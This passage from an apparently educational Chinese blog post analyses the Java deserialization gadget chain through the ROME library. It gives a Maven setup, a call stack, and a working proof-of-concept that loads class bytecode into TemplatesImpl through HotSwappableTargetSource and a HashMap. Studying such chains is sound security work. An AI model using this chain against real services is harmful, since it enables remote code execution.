+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.7.17<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">relativePath</span>/&gt;</span> <span class="comment">&lt;!-- lookup parent from repository --&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>ROME<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>rome<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>rome<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">getOutputProperties:507, TemplatesImpl</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl</span><br><span class="line">invoke:62, NativeMethodAccessorImpl</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl</span><br><span class="line">invoke:498, Method</span><br><span class="line">toString:137, ToStringBean</span><br><span class="line">toString:116, ToStringBean</span><br><span class="line">equals:392, XString</span><br><span class="line">equals:103, HotSwappableTargetSource</span><br><span class="line">putVal:635, HashMap</span><br><span class="line">put:612, HashMap</span><br><span class="line">main:29, ROMEHotSwappableTargetSource</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Utils.*;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.target.HotSwappableTargetSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ROMEHotSwappableTargetSource</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">byte</span>[] bytecodes = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\Calc.class&quot;</span>));</span><br><span class="line">        ReflectUtils.setFieldValue(templatesimpl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;Jasper&quot;</span>);</span><br><span class="line">        ReflectUtils.setFieldValue(templatesimpl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;bytecodes&#125;);</span><br><span class="line">        ReflectUtils.setFieldValue(templatesimpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(TemplatesImpl.class,templatesimpl);</span><br><span class="line">        <span class="comment">//        toStringBean.toString();</span></span><br><span class="line"></span><br><span class="line">        <span class="type">HotSwappableTargetSource</span> <span class="variable">h1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(toStringBean);</span><br><span class="line">        <span class="type">HotSwappableTargetSource</span> <span class="variable">h2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(<span class="keyword">new</span> <span class="title class_">XString</span>(<span class="string">&quot;xxx&quot;</span>));</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(h1,h1);</span><br><span class="line">        hashMap.put(h2,h2);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//        SerialUtils.serialize(hashMap);</span></span><br><span class="line">        SerialUtils.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>本质是，如果带了ROME这个组件，可以通过调toString，达到调任意getter的目的。</p>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a target="_blank" rel="noopener" href="https://goodapple.top/archives/1145">ROME反序列化@枫</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12768">ROME反序列化@Ic4_F1ame</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/blog/">Home</a></li>
+        
+          <li><a href="/blog/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/sketchpl4ne">Projects</a></li>
+        
+          <li><a href="/blog/links/">links</a></li>
+        
+          <li><a href="/blog/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">利用链分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Exp"><span class="toc-number">3.</span> <span class="toc-text">Exp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#HashMap"><span class="toc-number">3.1.</span> <span class="toc-text">HashMap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HashTable"><span class="toc-number">3.2.</span> <span class="toc-text">HashTable</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BadAttributeValueExpException"><span class="toc-number">3.3.</span> <span class="toc-text">BadAttributeValueExpException</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HotSwappableTargetSource"><span class="toc-number">3.4.</span> <span class="toc-text">HotSwappableTargetSource</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B0%8F%E7%BB%93"><span class="toc-number">4.</span> <span class="toc-text">小结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">5.</span> <span class="toc-text">参考链接</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://sketchpl4ne.github.io/blog/2023/12/24/0x0D%20Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20ROME%E9%93%BE/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://sketchpl4ne.github.io/blog/2023/12/24/0x0D%20Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20ROME%E9%93%BE/&text=Java反序列化 ROME链"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://sketchpl4ne.github.io/blog/2023/12/24/0x0D%20Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20ROME%E9%93%BE/&title=Java反序列化 ROME链"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://sketchpl4ne.github.io/blog/2023/12/24/0x0D%20Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20ROME%E9%93%BE/&is_video=false&description=Java反序列化 ROME链"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Java反序列化 ROME链&body=Check out this article: https://sketchpl4ne.github.io/blog/2023/12/24/0x0D%20Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20ROME%E9%93%BE/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://sketchpl4ne.github.io/blog/2023/12/24/0x0D%20Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20ROME%E9%93%BE/&title=Java反序列化 ROME链"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://sketchpl4ne.github.io/blog/2023/12/24/0x0D%20Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20ROME%E9%93%BE/&title=Java反序列化 ROME链"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://sketchpl4ne.github.io/blog/2023/12/24/0x0D%20Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20ROME%E9%93%BE/&title=Java反序列化 ROME链"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://sketchpl4ne.github.io/blog/2023/12/24/0x0D%20Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20ROME%E9%93%BE/&title=Java反序列化 ROME链"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://sketchpl4ne.github.io/blog/2023/12/24/0x0D%20Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20ROME%E9%93%BE/&name=Java反序列化 ROME链&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://sketchpl4ne.github.io/blog/2023/12/24/0x0D%20Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20ROME%E9%93%BE/&t=Java反序列化 ROME链"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2023
+    Jasper_sec
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/blog/">Home</a></li><!--
+     --><!--
+       --><li><a href="/blog/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/sketchpl4ne">Projects</a></li><!--
+     --><!--
+       --><li><a href="/blog/links/">links</a></li><!--
+     --><!--
+       --><li><a href="/blog/about/">About</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/blog/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+  <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?99ca4f1abdfd4d3c5c82d59c3565c6f2";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+        </script>
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
